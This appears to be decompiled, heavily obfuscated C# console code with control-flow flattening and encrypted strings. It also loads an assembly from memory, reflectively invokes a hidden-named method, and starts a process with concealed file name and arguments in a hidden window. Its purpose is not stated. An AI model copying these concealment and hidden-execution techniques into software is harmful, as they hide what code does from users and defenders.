using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

internal class Class0
{
	[STAThread]
	private static void Main()
	{
		while (true)
		{
			int num = Class5.smethod_0(14);
			int num2 = 11;
			while (true)
			{
				IL_0104:
				num2 ^= 0x17;
				int num3;
				while (true)
				{
					num3 = Class5.smethod_0(14);
					switch (num3 ^ 0xF)
					{
					case -15:
						goto end_IL_0007;
					case -14:
						goto IL_00f6;
					case -13:
						goto IL_0104;
					}
					continue;
					end_IL_0007:
					break;
				}
				switch (num2)
				{
				case 26:
					goto IL_004b;
				case 28:
					goto IL_00e1;
				case 27:
					goto end_IL_0104;
				}
				num3 = -3;
				num3 = -14;
				goto IL_00f6;
				IL_00e1:
				num ^= 0x18;
				num2 = Class12.smethod_2(21);
				num3 = -4;
				num3 = -13;
				continue;
				IL_00f6:
				num2 = Class12.smethod_2(21);
				num3 = -4;
				num3 = -13;
				continue;
				IL_004b:
				switch (num)
				{
				default:
					num2 = 12;
					continue;
				case -26:
					Console.WriteLine(DateTime.Now);
					num = -1;
					break;
				case -25:
					num = -15;
					break;
				case -24:
					smethod_4();
					num = -14;
					break;
				case -23:
					Console.WriteLine(Application.get_ExecutablePath());
					num = -10;
					break;
				case -22:
					num = -9;
					break;
				case -21:
					num = Class5.smethod_0(16);
					break;
				case -20:
					num = -24;
					break;
				case -19:
					smethod_5();
					num = -13;
					break;
				case -18:
					num = -11;
					break;
				case -17:
					smethod_1();
					num = -12;
					break;
				case -16:
					return;
				}
				goto IL_00e1;
				continue;
				end_IL_0104:
				break;
			}
		}
	}

	internal static void smethod_0(ref byte[] byte_0)
	{
		while (true)
		{
			int num = Class12.smethod_2(34);
			int num2 = 63;
			while (true)
			{
				IL_0099:
				num2 ^= 0x1A;
				int num3;
				while (true)
				{
					num3 = Class9.smethod_0(38);
					switch (num3 ^ 0x2A)
					{
					case -36:
						goto end_IL_0007;
					case -35:
						goto IL_008b;
					case -34:
						goto IL_0099;
					}
					continue;
					end_IL_0007:
					break;
				}
				switch (num2)
				{
				case 35:
					goto IL_0048;
				case 37:
					goto IL_0076;
				case 36:
					goto end_IL_0099;
				}
				num3 = -9;
				num3 = -35;
				goto IL_008b;
				IL_0076:
				num ^= 0x24;
				num2 = Class12.smethod_2(41);
				num3 = -12;
				num3 = -34;
				continue;
				IL_008b:
				num2 = Class12.smethod_2(41);
				num3 = -12;
				num3 = -34;
				continue;
				IL_0048:
				switch (num)
				{
				default:
					num2 = 62;
					continue;
				case -29:
					Array.Reverse((Array)byte_0, 0, byte_0.Length);
					num = -64;
					break;
				case -28:
					num = -63;
					break;
				case -27:
					return;
				}
				goto IL_0076;
				continue;
				end_IL_0099:
				break;
			}
		}
	}

	private static void smethod_1()
	{
		try
		{
			string[] array = File.ReadAllLines(Environment.CurrentDirectory + Class3.smethod_0(32321));
			int num = Class9.smethod_0(46);
			int num2 = 12;
			num2 = 58;
			Task[] array2 = default(Task[]);
			int num3 = default(int);
			Class2 @class = default(Class2);
			Task task = default(Task);
			string object_ = default(string);
			DateTime now = default(DateTime);
			double totalMilliseconds = default(double);
			TimeSpan timeSpan = default(TimeSpan);
			DateTime now2 = default(DateTime);
			while (true)
			{
				num ^= 0x2B;
				while (true)
				{
					num2 = Class9.smethod_0(46);
					switch (num2 ^ 0x36)
					{
					default:
						continue;
					case 56:
						switch (num)
						{
						case 37:
							array2 = new Task[array.Length];
							num = 2;
							goto end_IL_0047;
						case 39:
							num3 = 0;
							num = 3;
							goto end_IL_0047;
						case 40:
							if (num3 != 0)
							{
								num = 13;
								goto end_IL_0047;
							}
							goto IL_011b;
						case 41:
							@class = new Class2(array2.Length, array);
							num = 5;
							goto end_IL_0047;
						case 42:
							num = 4;
							goto end_IL_0047;
						case 43:
							task = @class.method_2(null, object_);
							num = 6;
							goto end_IL_0047;
						case 44:
							object_ = array[num3];
							num = 0;
							goto end_IL_0047;
						case 45:
							array2[num3] = task;
							num = 1;
							goto end_IL_0047;
						case 46:
							now = DateTime.Now;
							num = 12;
							goto end_IL_0047;
						case 47:
							num3++;
							goto IL_011b;
						case 38:
							{
								num = Class9.smethod_0(53);
								goto end_IL_0047;
							}
							IL_011b:
							if (num3 >= array2.Length && 0 == 0)
							{
								Task.WaitAll(array2);
								while (true)
								{
									int num4 = Class9.smethod_0(51);
									while (true)
									{
										switch (num4 ^ 0x2C)
										{
										case 49:
											totalMilliseconds = timeSpan.TotalMilliseconds;
											num4 = 28;
											num4 = 48;
											goto IL_016e;
										case 48:
											goto IL_016e;
										case 47:
											num4 = 1;
											num4 = 45;
											goto case 45;
										case 45:
											now2 = DateTime.Now;
											num4 = 2;
											num4 = 46;
											goto case 46;
										case 46:
											timeSpan = now2 - now;
											num4 = 29;
											num4 = 49;
											goto case 49;
										case 43:
											num4 = 0;
											num4 = 44;
											goto case 44;
										case 44:
											num4 = 30;
											num4 = 50;
											return;
										case 50:
											return;
										}
										break;
										IL_016e:
										Console.WriteLine(totalMilliseconds.ToString());
										num4 = Class9.smethod_0(53);
									}
								}
							}
							goto case 38;
						}
						num2 = 15;
						num2 = 57;
						goto case 57;
					case 57:
						num = Class9.smethod_0(46);
						num2 = 12;
						num2 = 58;
						break;
					case 58:
						break;
						end_IL_0047:
						break;
					}
					break;
				}
			}
		}
		catch
		{
			smethod_3();
		}
	}

	private static Type[] smethod_2()
	{
		int num = Class5.smethod_0(14);
		int num2 = 15;
		num2 = 55;
		int num4 = default(int);
		Assembly[] array = default(Assembly[]);
		Assembly[] assemblies = default(Assembly[]);
		List<Type> list = default(List<Type>);
		Assembly assembly = default(Assembly);
		while (true)
		{
			num ^= 0x36;
			while (true)
			{
				num2 = Class9.smethod_0(46);
				switch (num2 ^ 0x38)
				{
				default:
					continue;
				case 54:
					switch (num)
					{
					case -59:
						num = -15;
						goto end_IL_002c;
					case -58:
						if (num4 != 0)
						{
							num = -1;
							goto end_IL_002c;
						}
						goto IL_013f;
					case -57:
						array = assemblies;
						num = -4;
						goto end_IL_002c;
					case -56:
						assemblies = AppDomain.CurrentDomain.GetAssemblies();
						num = -3;
						goto end_IL_002c;
					case -54:
						num4 = 0;
						num = Class5.smethod_0(16);
						goto end_IL_002c;
					case -53:
						list = new List<Type>();
						num = -13;
						goto end_IL_002c;
					case -52:
						while (true)
						{
							int num3 = Class2.smethod_0(65);
							while (true)
							{
								switch (num3 ^ 0x3D)
								{
								case -52:
									list.AddRange(assembly.GetTypes());
									num3 = Class2.smethod_0(63);
									continue;
								case -55:
									num3 = -15;
									num3 = -52;
									goto case -52;
								case -54:
									num3 = -10;
									num3 = -53;
									goto case -53;
								case -53:
									num3 = -16;
									num3 = -51;
									goto case -51;
								case -51:
									num4++;
									goto end_IL_0120;
								}
								break;
							}
							continue;
							end_IL_0120:
							break;
						}
						goto IL_013f;
					case -55:
						{
							assembly = array[num4];
							num = -6;
							goto end_IL_002c;
						}
						IL_013f:
						if (num4 >= array.Length)
						{
							return list.ToArray();
						}
						goto case -55;
					}
					num2 = 13;
					num2 = 53;
					goto case 53;
				case 53:
					num = Class5.smethod_0(14);
					num2 = 15;
					num2 = 55;
					break;
				case 55:
					break;
					end_IL_002c:
					break;
				}
				break;
			}
		}
	}

	private static void smethod_3()
	{
		Type[] source = smethod_2();
		Func<Type, bool> func = _003C_003Ec._003C_003E9__4_0;
		if (func == null && 0 == 0)
		{
			func = (_003C_003Ec._003C_003E9__4_0 = (Type type_0) => type_0.FullName == Class3.smethod_0(32312));
		}
		Type type = source.First(func);
		type.InvokeMember(Class3.smethod_0(32558), BindingFlags.InvokeMethod, null, null, null);
	}

	private static void smethod_4()
	{
		Queue<int> queue = default(Queue<int>);
		while (true)
		{
			int num = Class9.smethod_0(44);
			int num2 = 4;
			while (true)
			{
				IL_0187:
				num2 ^= 0x49;
				int num3;
				while (true)
				{
					num3 = Class5.smethod_1(76);
					switch (num3 ^ 0x41)
					{
					case -69:
						goto end_IL_0007;
					case -68:
						goto IL_0176;
					case -67:
						goto IL_0187;
					}
					continue;
					end_IL_0007:
					break;
				}
				switch (num2)
				{
				case 75:
					goto IL_0052;
				case 77:
					goto IL_015c;
				case 76:
					goto end_IL_0187;
				}
				num3 = -3;
				num3 = -68;
				goto IL_0176;
				IL_015c:
				num ^= 0x43;
				num2 = Class5.smethod_0(26);
				num3 = -4;
				num3 = -67;
				continue;
				IL_0176:
				num2 = Class5.smethod_0(26);
				num3 = -4;
				num3 = -67;
				continue;
				IL_0052:
				switch (num)
				{
				default:
					num2 = 5;
					continue;
				case -73:
					num = -3;
					break;
				case -72:
					queue = new Queue<int>();
					num = -121;
					break;
				case -71:
					num = -125;
					break;
				case -70:
					num = -127;
					break;
				case -69:
					queue.Enqueue(29);
					num = -6;
					break;
				case -68:
					num = -128;
					break;
				case -67:
					num = -4;
					break;
				case -66:
					queue.Enqueue(24);
					num = -1;
					break;
				case -65:
					queue.Enqueue(4);
					num = -126;
					break;
				case -64:
					num = -122;
					break;
				case -63:
					num = Class5.smethod_1(72);
					break;
				case -62:
					queue.Enqueue(34);
					num = -2;
					break;
				case -61:
					queue.Enqueue(Assembly.Load(new Class1(null, null, null).method_0()).FullName!.GetHashCode());
					num = -7;
					break;
				case -60:
					queue.Enqueue(11);
					num = -12;
					break;
				case -59:
				{
					using Queue<int>.Enumerator enumerator = queue.GetEnumerator();
					while (enumerator.MoveNext() ? true : false)
					{
						int current = enumerator.Current;
						Console.Write(current);
					}
					return;
				}
				}
				goto IL_015c;
				continue;
				end_IL_0187:
				break;
			}
		}
	}

	private static void smethod_5()
	{
		while (true)
		{
			int num = Class12.smethod_2(22);
			int num2 = 10;
			while (true)
			{
				IL_00c5:
				num2 ^= 0x41;
				int num3;
				while (true)
				{
					num3 = Class2.smethod_0(61);
					switch (num3 ^ 0x48)
					{
					case 73:
						goto end_IL_0007;
					case 74:
						goto IL_00b8;
					case 75:
						goto IL_00c5;
					}
					continue;
					end_IL_0007:
					break;
				}
				switch (num2)
				{
				case 74:
					goto IL_0047;
				case 75:
					goto IL_00a4;
				case 73:
					goto end_IL_00c5;
				}
				num3 = 2;
				num3 = 74;
				goto IL_00b8;
				IL_00a4:
				num ^= 0x42;
				num2 = Class5.smethod_1(68);
				num3 = 3;
				num3 = 75;
				continue;
				IL_00b8:
				num2 = Class5.smethod_1(68);
				num3 = 3;
				num3 = 75;
				continue;
				IL_0047:
				switch (num)
				{
				default:
					num2 = 8;
					continue;
				case -67:
					num = -3;
					break;
				case -66:
					Process.Start(new ProcessStartInfo
					{
						FileName = Class3.smethod_0(32565),
						Arguments = Class3.smethod_0(32521),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true
					})!.WaitForExit();
					num = -1;
					break;
				case -65:
					return;
				}
				goto IL_00a4;
				continue;
				end_IL_00c5:
				break;
			}
		}
	}
}
